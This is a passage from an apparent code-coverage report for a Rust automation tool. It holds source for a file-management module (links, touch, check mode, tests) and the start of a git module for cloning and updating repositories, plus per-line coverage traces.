'{}'\",\n                        path_str, src\n                    )))\n                } else {\n                    Ok(ModuleOutput::ok(format!(\n                        \"Symlink '{}' already points to '{}'\",\n                        path_str, src\n                    )))\n                }\n            }\n\n            FileState::Hard =\u003e {\n                let src = src.ok_or_else(|| {\n                    ModuleError::MissingParameter(\"src is required for hard links\".to_string())\n                })?;\n                let src_path = Path::new(\u0026src);\n\n                if context.check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would create hard link '{}' -\u003e '{}'\",\n                        path_str, src\n                    )));\n                }\n\n                let created = Self::create_hardlink(src_path, path, force)?;\n\n                if created {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Created hard link '{}' -\u003e '{}'\",\n                        path_str, src\n                    )))\n                } else {\n                    Ok(ModuleOutput::ok(format!(\n                        \"Hard link '{}' already exists\",\n                        path_str\n                    )))\n                }\n            }\n\n            FileState::Touch =\u003e {\n                if context.check_mode {\n                    if path.exists() {\n                        return Ok(ModuleOutput::changed(format!(\n                            \"Would update timestamps on '{}'\",\n                            path_str\n                        )));\n                    }\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would create file '{}'\",\n                        path_str\n                    )));\n                }\n\n                Self::touch_file(path)?;\n\n                if let Some(m) = mode {\n                    Self::set_permissions(path, m)?;\n                }\n                Self::set_owner(path, owner, group)?;\n\n                Ok(ModuleOutput::changed(format!(\"Touched '{}'\", path_str)))\n            }\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"file\".to_string());\n        let state = FileState::from_str(\u0026state_str)?;\n\n        let current_state = Self::get_current_state(path);\n\n        let before = match current_state {\n            Some(FileState::File) =\u003e \"file exists\".to_string(),\n            Some(FileState::Directory) =\u003e \"directory exists\".to_string(),\n            Some(FileState::Link) =\u003e {\n                if let Ok(target) = fs::read_link(path) {\n                    format!(\"symlink -\u003e {}\", target.display())\n                } else {\n                    \"symlink\".to_string()\n                }\n            }\n            Some(FileState::Hard) =\u003e \"hard link\".to_string(),\n            None =\u003e \"absent\".to_string(),\n            _ =\u003e \"unknown\".to_string(),\n        };\n\n        let after = match state {\n            FileState::File =\u003e \"file\".to_string(),\n            FileState::Directory =\u003e \"directory\".to_string(),\n            FileState::Link =\u003e {\n                if let Some(src) = params.get_string(\"src\")? {\n                    format!(\"symlink -\u003e {}\", src)\n                } else {\n                    \"symlink\".to_string()\n                }\n            }\n            FileState::Hard =\u003e \"hard link\".to_string(),\n            FileState::Absent =\u003e \"absent\".to_string(),\n            FileState::Touch =\u003e \"touched\".to_string(),\n        };\n\n        if before == after {\n            Ok(None)\n        } else {\n            Ok(Some(Diff::new(before, after)))\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_file_create_directory() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testdir\");\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"directory\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(path.is_dir());\n    }\n\n    #[test]\n    fn test_file_create_directory_idempotent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testdir\");\n        fs::create_dir(\u0026path).unwrap();\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"directory\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_file_create_file() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"file\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(path.is_file());\n    }\n\n    #[test]\n    fn test_file_absent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n        fs::write(\u0026path, \"content\").unwrap();\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"absent\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(!path.exists());\n    }\n\n    #[test]\n    fn test_file_symlink() {\n        let temp = TempDir::new().unwrap();\n        let src = temp.path().join(\"source\");\n        let dest = temp.path().join(\"link\");\n        fs::write(\u0026src, \"content\").unwrap();\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(dest.to_str().unwrap()),\n        );\n        params.insert(\"src\".to_string(), serde_json::json!(src.to_str().unwrap()));\n        params.insert(\"state\".to_string(), serde_json::json!(\"link\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(dest.is_symlink());\n        assert_eq!(fs::read_link(\u0026dest).unwrap(), src);\n    }\n\n    #[test]\n    fn test_file_with_mode() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"file\"));\n        params.insert(\"mode\".to_string(), serde_json::json!(0o755));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let meta = fs::metadata(\u0026path).unwrap();\n        assert_eq!(meta.permissions().mode() \u0026 0o7777, 0o755);\n    }\n\n    #[test]\n    fn test_file_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testdir\");\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"directory\"));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would create\"));\n        assert!(!path.exists()); // Should not be created in check mode\n    }\n\n    #[test]\n    fn test_file_touch() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"testfile\");\n\n        let module = FileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"state\".to_string(), serde_json::json!(\"touch\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(path.exists());\n    }\n}\n","traces":[{"line":32,"address":[30147750,30146800,30147744],"length":1,"stats":{"Line":1}},{"line":33,"address":[30146929,30146827],"length":1,"stats":{"Line":2}},{"line":34,"address":[30146945,30147016],"length":1,"stats":{"Line":2}},{"line":35,"address":[30146988,30147042],"length":1,"stats":{"Line":2}},{"line":36,"address":[30147128],"length":1,"stats":{"Line":1}},{"line":37,"address":[30147241],"length":1,"stats":{"Line":1}},{"line":38,"address":[30147424,30147354],"length":1,"stats":{"Line":2}},{"line":39,"address":[30147449,30147492,30147397],"length":1,"stats":{"Line":3}},{"line":40,"address":[30147460,30147514],"length":1,"stats":{"Line":0}},{"line":52,"address":[30145872],"length":1,"stats":{"Line":1}},{"line":53,"address":[30145905],"length":1,"stats":{"Line":1}},{"line":54,"address":[30145989],"length":1,"stats":{"Line":1}},{"line":57,"address":[30145946],"length":1,"stats":{"Line":1}},{"line":58,"address":[30146045],"length":1,"stats":{"Line":1}},{"line":59,"address":[30146006],"length":1,"stats":{"Line":0}},{"line":62,"address":[30146108,30146163],"length":1,"stats":{"Line":1}},{"line":63,"address":[30146158],"length":1,"stats":{"Line":0}},{"line":64,"address":[30146142,30146189],"length":1,"stats":{"Line":2}},{"line":65,"address":[30146184],"length":1,"stats":{"Line":1}},{"line":66,"address":[30146209,30146168,30146199],"length":1,"stats":{"Line":2}},{"line":67,"address":[30146204],"length":1,"stats":{"Line":1}},{"line":69,"address":[30146194],"length":1,"stats":{"Line":0}},{"line":73,"address":[30144592],"length":1,"stats":{"Line":1}},{"line":74,"address":[30144646],"length":1,"stats":{"Line":1}},{"line":77,"address":[30144796],"length":1,"stats":{"Line":1}},{"line":78,"address":[30144887],"length":1,"stats":{"Line":0}},{"line":81,"address":[30144830],"length":1,"stats":{"Line":1}},{"line":82,"address":[30144876],"length":1,"stats":{"Line":1}},{"line":83,"address":[30144934,30145024],"length":1,"stats":{"Line":0}},{"line":84,"address":[30145059],"length":1,"stats":{"Line":0}},{"line":86,"address":[30144911],"length":1,"stats":{"Line":1}},{"line":89,"address":[30146240],"length":1,"stats":{"Line":1}},{"line":92,"address":[30146338],"length":1,"stats":{"Line":1}},{"line":93,"address":[30146488],"length":1,"stats":{"Line":1}},{"line":94,"address":[30146509],"length":1,"stats":{"Line":1}},{"line":96,"address":[30146542],"length":1,"stats":{"Line":1}},{"line":97,"address":[30146571],"length":1,"stats":{"Line":1}},{"line":99,"address":[30146598],"length":1,"stats":{"Line":1}},{"line":100,"address":[30146633,30146737],"length":1,"stats":{"Line":0}},{"line":101,"address":[30146772],"length":1,"stats":{"Line":0}},{"line":103,"address":[30146702],"length":1,"stats":{"Line":1}},{"line":106,"address":[30145088],"length":1,"stats":{"Line":1}},{"line":107,"address":[30145170],"length":1,"stats":{"Line":1}},{"line":108,"address":[30145198],"length":1,"stats":{"Line":1}},{"line":109,"address":[30145849],"length":1,"stats":{"Line":1}},{"line":111,"address":[30145621],"length":1,"stats":{"Line":0}},{"line":113,"address":[30145600],"length":1,"stats":{"Line":0}},{"line":118,"address":[30145183],"length":1,"stats":{"Line":1}},{"line":119,"address":[30145290,30145416],"length":1,"stats":{"Line":0}},{"line":121,"address":[30145351,30145226],"length":1,"stats":{"Line":1}},{"line":124,"address":[30145381,30145446],"length":1,"stats":{"Line":1}},{"line":125,"address":[30145558,30145457],"length":1,"stats":{"Line":0}},{"line":128,"address":[30145531],"length":1,"stats":{"Line":1}},{"line":131,"address":[30139456],"length":1,"stats":{"Line":1}},{"line":132,"address":[30139524],"length":1,"stats":{"Line":1}},{"line":133,"address":[30139608],"length":1,"stats":{"Line":0}},{"line":134,"address":[30140346],"length":1,"stats":{"Line":0}},{"line":136,"address":[30140118],"length":1,"stats":{"Line":0}},{"line":138,"address":[30140097],"length":1,"stats":{"Line":0}},{"line":144,"address":[30139627,30139543],"length":1,"stats":{"Line":2}},{"line":145,"address":[30139669],"length":1,"stats":{"Line":1}},{"line":146,"address":[30139755],"length":1,"stats":{"Line":0}},{"line":150,"address":[30139864,30139690],"length":1,"stats":{"Line":1}},{"line":152,"address":[30139929],"length":1,"stats":{"Line":1}},{"line":153,"address":[30140054,30139952],"length":1,"stats":{"Line":1}},{"line":156,"address":[30140027],"length":1,"stats":{"Line":1}},{"line":159,"address":[30142153,30141040,30142159],"length":1,"stats":{"Line":1}},{"line":161,"address":[30141125],"length":1,"stats":{"Line":1}},{"line":162,"address":[30141894,30141170],"length":1,"stats":{"Line":0}},{"line":163,"address":[30141980,30141927],"length":1,"stats":{"Line":0}},{"line":164,"address":[30142010],"length":1,"stats":{"Line":0}},{"line":167,"address":[30142203],"length":1,"stats":{"Line":0}},{"line":168,"address":[30142519],"length":1,"stats":{"Line":0}},{"line":170,"address":[30142244],"length":1,"stats":{"Line":0}},{"line":172,"address":[30142223],"length":1,"stats":{"Line":0}},{"line":175,"address":[30141145],"length":1,"stats":{"Line":1}},{"line":176,"address":[30141299],"length":1,"stats":{"Line":0}},{"line":177,"address":[30141612],"length":1,"stats":{"Line":0}},{"line":178,"address":[30141716,30141818],"length":1,"stats":{"Line":0}},{"line":180,"address":[30141647,30141780],"length":1,"stats":{"Line":0}},{"line":183,"address":[30141340],"length":1,"stats":{"Line":0}},{"line":185,"address":[30141319],"length":1,"stats":{"Line":0}},{"line":191,"address":[30142615,30141233],"length":1,"stats":{"Line":2}},{"line":192,"address":[30142657],"length":1,"stats":{"Line":1}},{"line":193,"address":[30142756],"length":1,"stats":{"Line":0}},{"line":197,"address":[30142857,30142678],"length":1,"stats":{"Line":1}},{"line":198,"address":[30142895],"length":1,"stats":{"Line":1}},{"line":201,"address":[30142928],"length":1,"stats":{"Line":0}},{"line":202,"address":[30143029],"length":1,"stats":{"Line":0}},{"line":203,"address":[30143073],"length":1,"stats":{"Line":0}},{"line":205,"address":[30143052],"length":1,"stats":{"Line":0}},{"line":210,"address":[30143321],"length":1,"stats":{"Line":0}},{"line":211,"address":[30143427],"length":1,"stats":{"Line":0}},{"line":212,"address":[30143591],"length":1,"stats":{"Line":0}},{"line":215,"address":[30143803,30143745],"length":1,"stats":{"Line":0}},{"line":216,"address":[30143852],"length":1,"stats":{"Line":0}},{"line":219,"address":[30143793],"length":1,"stats":{"Line":0}},{"line":220,"address":[30144180],"length":1,"stats":{"Line":0}},{"line":222,"address":[30143905],"length":1,"stats":{"Line":0}},{"line":224,"address":[30143884],"length":1,"stats":{"Line":0}},{"line":230,"address":[30143355,30144276],"length":1,"stats":{"Line":0}},{"line":231,"address":[30144318],"length":1,"stats":{"Line":0}},{"line":232,"address":[30144418],"length":1,"stats":{"Line":0}},{"line":236,"address":[30144349,30144519],"length":1,"stats":{"Line":0}},{"line":237,"address":[30144557],"length":1,"stats":{"Line":0}},{"line":240,"address":[30140368],"length":1,"stats":{"Line":1}},{"line":241,"address":[30140440],"length":1,"stats":{"Line":1}},{"line":242,"address":[30140549],"length":1,"stats":{"Line":0}},{"line":245,"address":[30140584,30140479],"length":1,"stats":{"Line":1}},{"line":247,"address":[30140663],"length":1,"stats":{"Line":1}},{"line":248,"address":[30140746],"length":1,"stats":{"Line":0}},{"line":249,"address":[30140894,30140996],"length":1,"stats":{"Line":0}},{"line":251,"address":[30140830,30140958],"length":1,"stats":{"Line":0}},{"line":254,"address":[30140686,30140761],"length":1,"stats":{"Line":1}},{"line":257,"address":[30140799],"length":1,"stats":{"Line":1}},{"line":260,"address":[30138944],"length":1,"stats":{"Line":1}},{"line":263,"address":[30139000],"length":1,"stats":{"Line":1}},{"line":265,"address":[30139019,30139179],"length":1,"stats":{"Line":1}},{"line":266,"address":[30139237],"length":1,"stats":{"Line":1}},{"line":270,"address":[30139062],"length":1,"stats":{"Line":0}},{"line":271,"address":[30139272,30139097],"length":1,"stats":{"Line":0}},{"line":272,"address":[30139308],"length":1,"stats":{"Line":0}},{"line":274,"address":[30139421],"length":1,"stats":{"Line":0}},{"line":279,"address":[30126640],"length":1,"stats":{"Line":0}},{"line":283,"address":[30123376],"length":1,"stats":{"Line":0}},{"line":287,"address":[30123408],"length":1,"stats":{"Line":0}},{"line":291,"address":[30123424],"length":1,"stats":{"Line":0}},{"line":295,"address":[30127104,30135014,30138925],"length":1,"stats":{"Line":1}},{"line":300,"address":[30127208],"length":1,"stats":{"Line":1}},{"line":301,"address":[30127468,30127571],"length":1,"stats":{"Line":2}},{"line":302,"address":[30138923,30127730,30127646],"length":1,"stats":{"Line":1}},{"line":304,"address":[31966076,31966064],"length":1,"stats":{"Line":1}},{"line":305,"address":[30138902,30127825,30127904],"length":1,"stats":{"Line":2}},{"line":306,"address":[30138900,30128062],"length":1,"stats":{"Line":1}},{"line":307,"address":[30138898,30128264],"length":1,"stats":{"Line":1}},{"line":308,"address":[30128466,30138896],"length":1,"stats":{"Line":1}},{"line":309,"address":[30128668],"length":1,"stats":{"Line":1}},{"line":310,"address":[30128714],"length":1,"stats":{"Line":1}},{"line":311,"address":[30128760,30138875],"length":1,"stats":{"Line":1}},{"line":313,"address":[30129054,30128994],"length":1,"stats":{"Line":2}},{"line":316,"address":[30129061],"length":1,"stats":{"Line":1}},{"line":318,"address":[30136507,30129284],"length":1,"stats":{"Line":2}},{"line":319,"address":[30137410,30136540],"length":1,"stats":{"Line":0}},{"line":325,"address":[30136521],"length":1,"stats":{"Line":1}},{"line":326,"address":[30137369],"length":1,"stats":{"Line":0}},{"line":327,"address":[30137314,30136613,30136976],"length":1,"stats":{"Line":0}},{"line":328,"address":[30137400,30137115,30137138,30137346],"length":1,"stats":{"Line":0}},{"line":332,"address":[30136971,30136659,30136584],"length":1,"stats":{"Line":2}},{"line":333,"address":[30136790],"length":1,"stats":{"Line":1}},{"line":337,"address":[30129126],"length":1,"stats":{"Line":1}},{"line":338,"address":[30132562,30131343],"length":1,"stats":{"Line":2}},{"line":340,"address":[30132858,30132603,30132787],"length":1,"stats":{"Line":0}},{"line":341,"address":[30133086,30132824],"length":1,"stats":{"Line":0}},{"line":346,"address":[30132905],"length":1,"stats":{"Line":0}},{"line":351,"address":[30132576,30132629],"length":1,"stats":{"Line":2}},{"line":357,"address":[30132553,30131388,30131305],"length":1,"stats":{"Line":2}},{"line":358,"address":[30131579,30131517],"length":1,"stats":{"Line":2}},{"line":359,"address":[30131600,30131794,30131564],"length":1,"stats":{"Line":0}},{"line":361,"address":[30131571],"length":1,"stats":{"Line":1}},{"line":363,"address":[30132548,30131744,30131815],"length":1,"stats":{"Line":2}},{"line":365,"address":[30132543,30131949],"length":1,"stats":{"Line":2}},{"line":366,"address":[30132394,30131973],"length":1,"stats":{"Line":2}},{"line":370,"address":[30131953,30132389,30132007,30132235],"length":1,"stats":{"Line":3}},{"line":371,"address":[30132021,30132240],"length":1,"stats":{"Line":0}},{"line":376,"address":[30132059],"length":1,"stats":{"Line":1}},{"line":384,"address":[30129100],"length":1,"stats":{"Line":1}},{"line":385,"address":[30129364,30130613],"length":1,"stats":{"Line":0}},{"line":386,"address":[30130838,30130654,30130909],"length":1,"stats":{"Line":0}},{"line":387,"address":[30130875,30131137],"length":1,"stats":{"Line":0}},{"line":392,"address":[30130956],"length":1,"stats":{"Line":0}},{"line":397,"address":[30130627,30130680],"length":1,"stats":{"Line":0}},{"line":403,"address":[30130604,30129409,30129334],"length":1,"stats":{"Line":2}},{"line":404,"address":[30129600,30129538],"length":1,"stats":{"Line":2}},{"line":405,"address":[30129621,30129585,30129815],"length":1,"stats":{"Line":2}},{"line":407,"address":[30129592],"length":1,"stats":{"Line":1}},{"line":409,"address":[30129852,30129765,30130599],"length":1,"stats":{"Line":2}},{"line":411,"address":[30129986,30130594],"length":1,"stats":{"Line":2}},{"line":412,"address":[30130445,30130010],"length":1,"stats":{"Line":2}},{"line":416,"address":[30129990,30130044,30130440],"length":1,"stats":{"Line":0}},{"line":417,"address":[30130291,30130058],"length":1,"stats":{"Line":0}},{"line":422,"address":[30130096],"length":1,"stats":{"Line":0}},{"line":430,"address":[30133256,30135261,30133340,30129144],"length":1,"stats":{"Line":2}},{"line":431,"address":[31966126],"length":1,"stats":{"Line":0}},{"line":433,"address":[30133429,30133520],"length":1,"stats":{"Line":2}},{"line":435,"address":[30133536],"length":1,"stats":{"Line":1}},{"line":436,"address":[30134319,30133598],"length":1,"stats":{"Line":0}},{"line":437,"address":[30134487,30134397],"length":1,"stats":{"Line":0}},{"line":438,"address":[30134535,30134591],"length":1,"stats":{"Line":0}},{"line":439,"address":[30134736,30134627],"length":1,"stats":{"Line":0}},{"line":446,"address":[30134333,30135064],"length":1,"stats":{"Line":0}},{"line":452,"address":[30134291,30133559,30133643],"length":1,"stats":{"Line":2}},{"line":454,"address":[30134286,30133771],"length":1,"stats":{"Line":2}},{"line":455,"address":[30134094,30133834],"length":1,"stats":{"Line":2}},{"line":460,"address":[30133783,30133880],"length":1,"stats":{"Line":0}},{"line":468,"address":[30135282,30129210,30136498,30135366],"length":1,"stats":{"Line":0}},{"line":469,"address":[31966222],"length":1,"stats":{"Line":0}},{"line":471,"address":[30135455,30135546],"length":1,"stats":{"Line":0}},{"line":473,"address":[30135562],"length":1,"stats":{"Line":0}},{"line":474,"address":[30135626,30136301],"length":1,"stats":{"Line":0}},{"line":480,"address":[30135688,30136277,30135595],"length":1,"stats":{"Line":0}},{"line":482,"address":[30135816,30136272],"length":1,"stats":{"Line":0}},{"line":483,"address":[30135863,30136080],"length":1,"stats":{"Line":0}},{"line":488,"address":[30135828,30135909],"length":1,"stats":{"Line":0}},{"line":496,"address":[30129306],"length":1,"stats":{"Line":1}},{"line":497,"address":[30137599,30138437],"length":1,"stats":{"Line":0}},{"line":498,"address":[30138670,30138486],"length":1,"stats":{"Line":0}},{"line":503,"address":[30138516,30138451],"length":1,"stats":{"Line":0}},{"line":509,"address":[30137629,30138428,30137582],"length":1,"stats":{"Line":2}},{"line":511,"address":[30138009,30137754],"length":1,"stats":{"Line":1}},{"line":512,"address":[30137801,30138014,30137887],"length":1,"stats":{"Line":0}},{"line":514,"address":[30138035,30138423,30137818],"length":1,"stats":{"Line":2}},{"line":516,"address":[30138166],"length":1,"stats":{"Line":1}},{"line":521,"address":[30126672,30127072,30127078],"length":1,"stats":{"Line":1}},{"line":526,"address":[30127008],"length":1,"stats":{"Line":1}},{"line":529,"address":[30125191,30126619,30123456],"length":1,"stats":{"Line":0}},{"line":530,"address":[30123516],"length":1,"stats":{"Line":0}},{"line":531,"address":[30123776,30123864],"length":1,"stats":{"Line":0}},{"line":532,"address":[30123939,30126617,30124023],"length":1,"stats":{"Line":0}},{"line":534,"address":[30124080],"length":1,"stats":{"Line":0}},{"line":535,"address":[30126596,30124197,30124118],"length":1,"stats":{"Line":0}},{"line":537,"address":[30124357],"length":1,"stats":{"Line":0}},{"line":539,"address":[30124379],"length":1,"stats":{"Line":0}},{"line":540,"address":[30124673,30124552],"length":1,"stats":{"Line":0}},{"line":541,"address":[30124686,30124583],"length":1,"stats":{"Line":0}},{"line":543,"address":[30125205,30124632,30124699,30124770],"length":1,"stats":{"Line":0}},{"line":544,"address":[30124810,30124881],"length":1,"stats":{"Line":0}},{"line":546,"address":[30125197,30124736],"length":1,"stats":{"Line":0}},{"line":549,"address":[30124639,30125251],"length":1,"stats":{"Line":0}},{"line":550,"address":[30124446],"length":1,"stats":{"Line":0}},{"line":551,"address":[30125264,30124518],"length":1,"stats":{"Line":0}},{"line":554,"address":[30124489],"length":1,"stats":{"Line":0}},{"line":555,"address":[30125279,30125525],"length":1,"stats":{"Line":0}},{"line":556,"address":[30125313,30125563],"length":1,"stats":{"Line":0}},{"line":558,"address":[30125589,30125352,30126066],"length":1,"stats":{"Line":0}},{"line":559,"address":[30125928,30125823],"length":1,"stats":{"Line":0}},{"line":561,"address":[30126058,30125850],"length":1,"stats":{"Line":0}},{"line":564,"address":[30126128,30125382],"length":1,"stats":{"Line":0}},{"line":565,"address":[30125416,30126141],"length":1,"stats":{"Line":0}},{"line":566,"address":[30126154,30125450],"length":1,"stats":{"Line":0}},{"line":569,"address":[30126373,30126212,30125549],"length":1,"stats":{"Line":0}},{"line":570,"address":[30126337],"length":1,"stats":{"Line":0}},{"line":572,"address":[30126218,30126375],"length":1,"stats":{"Line":0}}],"covered":115,"coverable":242},{"path":["/","home","artur","Repositories","rustible","src","modules","git.rs"],"content":"//! Git module - Git repository management\n//!\n//! This module manages git repositories including cloning, updating,\n//! and checking out specific versions or branches.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse std::path::Path;\nuse std::process::Command;\n\n/// Module for git repository management\npub struct GitModule;\n\nimpl GitModule {\n    /// Check if git is installed\n    fn check_git_installed() -\u003e ModuleResult\u003cbool\u003e {\n        let output = Command::new(\"git\")\n            .arg(\"--version\")\n            .output()\n            .map_err(|_| ModuleError::ExecutionFailed(\"git is not installed\".to_string()))?;\n        Ok(output.status.success())\n    }\n\n    /// Check if a directory is a git repository\n    fn is_git_repo(dest: \u0026str) -\u003e bool {\n        Path::new(\u0026format!(\"{}/.git\", dest)).exists()\n    }\n\n    /// Get the current HEAD commit hash\n    fn get_current_version(dest: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let output = Command::new(\"git\")\n            .arg(\"-C\")\n            .arg(dest)\n            .arg(\"rev-parse\")\n            .arg(\"HEAD\")\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to get current version: {}\", e))\n            })?;\n\n        if output.status.success() {\n            Ok(Some(\n                String::from_utf8_lossy(\u0026output.stdout).trim().to_string(),\n            ))\n        } else {\n            Ok(None)\n        }\n    }\n\n    /// Get the remote URL of the repository\n    fn get_remote_url(dest: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let output = Command::new(\"git\")\n            .arg(\"-C\")\n            .arg(dest)\n            .arg(\"config\")\n            .arg(\"--get\")\n            .arg(\"remote.origin.url\")\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to get remote URL: {}\", e))\n            })?;\n\n        if output.status.success() {\n            Ok(Some(\n                String::from_utf8_lossy(\u0026output.stdout).trim().to_string(),\n            ))\n        } else {\n            Ok(None)\n        }\n    }\n\n    /// Clone a git repository\n    fn clone_repo(\n        repo: \u0026str,\n        dest: \u0026str,\n        version: Option\u003c\u0026str\u003e,\n        depth: Option\u003cu32\u003e,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let mut command = Command::new(\"git\");\n        command.arg(\"clone\");\n\n        if let Some(d) = depth {\n            command.arg(\"--depth\").arg(d.to_string());\n        }\n\n        if let Some(v) = version {\n            command.arg(\"--branch\").arg(v);\n        }\n\n        command.arg(repo).arg(dest);\n\n        let output = command.output().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to clone repository: {}\", e))\n        })?;\n\n        if !output.status.success() {\n            let stderr = String::from_utf8_lossy(\u0026output.stderr);\n            return Err(ModuleError::CommandFailed {\n                code: output.status.code().unwrap_or(-1),\n                message: stderr.to_string(),\n            });\n        }\n\n        Ok(ModuleOutput::changed(format!(\n            \"Cloned repository '{}' to '{}'\",\n            repo, dest\n        )))\n    }\n\n    /// Update (pull) a git repository\n    fn update_repo(\n        dest: \u0026str,\n        version: Option\u003c\u0026str\u003e,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String)\u003e {\n        // Get current version before update\n        let before_version =\n            Self::get_current_version(dest)?.unwrap_or_else(|| \"unknown\".to_string());\n\n        if context.check_mode {\n            return Ok((false, before_version));\n        }\n\n        // Fetch updates\n        let fetch_output = Command::new(\"git\")\n            .arg(\"-C\")\n            .arg(dest)\n            .arg(\"fetch\")\n            .arg(\"origin\")\n            .output()\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Failed to fetch updates: {}\", e)))?;\n\n        if !fetch_output.status.success() {\n            return Err(ModuleError::CommandFailed {\n                code: fetch_output.status.code().unwrap_or(-1),\n                message: String::from_utf8_lossy(\u0026fetch_output.stderr).to_string(),\n            });\n        }\n\n        // Checkout the specified version or default branch\n        let checkout_target = version.unwrap_or(\"origin/HEAD\");\n        let checkout_output = Command::new(\"git\")\n            .arg(\"-C\")\n            .arg(dest)\n            .arg(\"checkout\")\n            .arg(checkout_target)\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to checkout version: {}\", e))\n            })?;\n\n        if !checkout_output.status.success() {\n            return Err(ModuleError::CommandFailed {\n                code: checkout_output.status.code().unwrap_or(-1),\n                message: String::from_utf8_lossy(\u0026checkout_output.stderr).to_string(),\n            });\n        }\n\n        // If on a branch, pull the latest changes\n        if version.is_none() || !version.unwrap().starts_with(\"v\") {\n            let _ = Command::new(\"git\")\n                .arg(\"-C\")\n                .arg(dest)\n                .arg(\"pull\")\n                .arg(\"--ff-only\")\n                .output();\n        }\n\n        // Get version after update\n        let after_version =\n            Self::get_current_version(dest)?.unwrap_or_else(|| \"unknown\".to_string());\n\n        let changed = before_version != after_version;\n        Ok((changed, after_version))\n    }\n}\n\nimpl Module for GitModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"git\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage git repositories - clone, update, and checkout versions\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"repo\", \"dest\"]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Validate required parameters\n        if params.get(\"repo\").is_none() {\n            return Err(ModuleError::MissingParameter(\"repo\".to_string()));\n        }\n        if params.get(\"dest\").is_none() {\n            return Err(ModuleError::MissingParameter(\"dest\".to_string()));\n        